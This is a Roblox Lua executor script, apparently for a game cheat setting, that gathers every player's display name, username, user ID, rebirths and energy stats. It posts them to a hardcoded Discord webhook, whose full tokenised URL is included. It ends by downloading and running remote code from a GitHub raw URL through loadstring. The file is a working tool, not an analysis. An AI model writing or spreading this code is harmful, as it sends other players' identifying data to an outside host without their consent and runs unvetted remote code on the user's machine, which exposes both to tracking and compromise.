local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

getgenv().logs = "https://discord.com/api/webhooks/1321162509956284497/NuwH0dIPMqKVuDo0CyF-6k3coh0t93o3Vq4hiCgVCfChHfIR5XQ9vN9bFPszXIsIiZtv"

-- Global suffixes list
local suffixes = {
    "", "K", "M", "B", "T",
    "QD", "QN", "SX", "SP", "Oc", "No", "Dec",
    "UnD", "DD", "TD", "QdD", "QND", "SXD", 
    "SPD", "OD", "ND", "VN", "UVN", "DUOVN",
    "TREVN","QVN","SXVN","SPVN","OCVN","NOVN",
    "TRI","UTri","DuoTri","TreTri","QdTri","QnTri",
    "SxTri","SpTri","OcTri","NoTri","Qua","UQua",
    "DQua","TQua","QdQua","QnQua","QnQua","SxQua",
    "SpQua","OcQua","NoQua","Qnt","UQnt","DQnt",
    "TQnt","QdQnt","QnQnt","SxQnt","SpQnt","OcQnt",
    "NoQnt","Sxa","USxa","DSxa","TSxa","QdSxa","QnSxa",
    "SxSxa","SpSxa","OcSxa","NoSxa","Spt","USpt","DSpt",
    "TSpt","QdSpt","QnSpt","SxSpt","SpSpt","OcSpt","NoSpt",
    "Oct","UOct","DOct","TOct","QdOct","QnOct","SxOct","SpOct",
    "OcOct","NoOct","Non","UNon","DNon","TNon","QdNon","QnNon",
    "SxNon","SpNon","OcNon","NoNon","Ce","UCe","DCe"
}

-- Format large numbers into readable suffix format
local function formatNumber(number)
    local suffixIndex = 1

    while math.abs(number) >= 1000 and suffixIndex < #suffixes do
        number = number / 1000.0
        suffixIndex = suffixIndex + 1
    end

    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- Build stat tiers from suffixes
local stats = {}

for i = #suffixes, 1, -1 do
    local value = 10 ^ (3 * (i - 1))
    if value >= 1e6 then
        table.insert(stats, { value = value, label = "1" .. suffixes[i] .. "+" })
    end
end

table.insert(stats, { value = 0, label = "<1M" })

-- Rebirth tier labels
local rebirthsGroup = {
    {1000000000, "1B+"}, {100000000, "100M+"}, {10000000, "10M+"}, {1000000, "1M+"}, {500000, "500k+"},
    {250000, "250k+"}, {200000, "200k+"}, {150000, "150k+"}, {125000, "125k+"}, {100000, "100k+"},
    {85000, "85k+"}, {75000, "75k+"}, {66666, "66k+"}, {60000, "60k+"}, {55000, "55k+"},
    {50000, "50k+"}, {45000, "45k+"}, {40000, "40k+"}, {33333, "33k+"}, {30000, "30k+"},
    {25000, "25k+"}, {20000, "20k+"}, {15000, "15k+"}, {10000, "10k+"}, {5000, "5k+"},
    {2500, "2.5k+"}, {1000, "1k+"}, {100, "100+"}, {3, "3+"}, {0, "0+"}
}

-- Label from energy value
local function getStatLabel(value)
    for _, stat in ipairs(stats) do
        if value >= stat.value then
            return stat.label
        end
    end
    return "<1M"
end

-- Label from rebirth count
local function getRebirthLabel(value)
    for _, rebirth in ipairs(rebirthsGroup) do
        if value >= rebirth[1] then
            return rebirth[2]
        end
    end
    return "0+"
end

-- Send formatted log to Discord webhook
local function LoggerBogger(content)
    local data = {
        ["username"] = "Stat Logger",
        ["avatar_url"] = "https://images-ext-1.discordapp.net/external/l5-KoXA2mt7NrUE6gWvxiprX6o72ojZeBHhDDdoI9IE/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1320931723717902376/174fde885a08dfd98be5ffefa681b07d.png?format=webp&quality=lossless&width=663&height=663",
        ["content"] = content
    }

    local jsonData = HttpService:JSONEncode(data)
    local headers = { ["Content-Type"] = "application/json" }

    if syn and syn.request then
        syn.request({ Url = getgenv().logs, Body = jsonData, Method = "POST", Headers = headers })
    elseif request then
        request({ Url = getgenv().logs, Body = jsonData, Method = "POST", Headers = headers })
    else
        warn("HTTP request function not found. Unable to send to webhook.")
    end
end

-- Main logger function
local function log()
    local logMessage = ""
    for _, player in ipairs(Players:GetPlayers()) do
        local data = ReplicatedStorage:FindFirstChild("Datas") and ReplicatedStorage.Datas:FindFirstChild(player.UserId)
        if not data then continue end

        local rebirths = data:FindFirstChild("Rebirth") and data.Rebirth.Value or 0
        local energy = data:FindFirstChild("Energy") and data.Energy.Value or 0

        local formattedEnergy = formatNumber(energy)
        local rebirthLabel = getRebirthLabel(rebirths)
        local statLabel = getStatLabel(energy)

        logMessage = logMessage .. string.format("[%s] [%s] | %s (@%s, UserID: %d), Rebirths: %d Stats: %s\n", rebirthLabel, statLabel, player.DisplayName, player.Name, player.UserId, rebirths, formattedEnergy)
    end

    LoggerBogger(logMessage)
end

-- Run it
log()

loadstring(game:HttpGet("https://raw.githubusercontent.com/XCtze/SRW/refs/heads/main/lbsorting"))()

